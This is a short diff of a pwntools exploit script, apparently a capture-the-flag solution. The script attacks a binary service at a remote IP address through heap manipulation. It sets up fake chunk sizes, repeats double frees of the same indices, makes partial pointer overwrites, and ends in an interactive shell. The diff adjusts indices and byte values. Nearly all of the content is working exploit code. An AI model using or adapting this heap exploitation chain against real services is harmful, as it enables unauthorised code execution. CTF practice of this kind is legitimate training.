@@ -37,6 +37,7 @@ def Free(idx):
 
 #p=process('./pwn')
 p=remote("139.180.216.34",8888)
+#context.log_level='debug'
 add(0x18,0)
 add(0x18,1)
 add(0x60,2,p64(0x0)+p64(0x21)+'\x00'*0x18+p64(0x21)*5)
@@ -47,22 +48,27 @@ free(0)
 free(1)
 free(0)
 free(1)
+
 add(0x18,0,"\x50")
 add(0x18,0,'\x00'*8)
 add(0x18,0,"A")
+
 add(0x18,0,'GET')
 
 edit(2,p64(0x0)+p64(0x91))
 free(0)
+
 add(0x18,0)
 add(0x60,0,'\xdd\x25')
 
-free(4)
+free(2)
 free(5)
-free(4)
+free(2)
 free(5)
-add(0x60,4,'\x70\x70')
+
 #gdb.attach(p,'')
+add(0x60,4,'\x70')
+#
 add(0x60,0)
 add(0x60,0)
 add(0x60,0)
@@ -89,6 +95,7 @@ Free(1)
 Free(1)
 
 p.interactive()
+
 
 ```
 
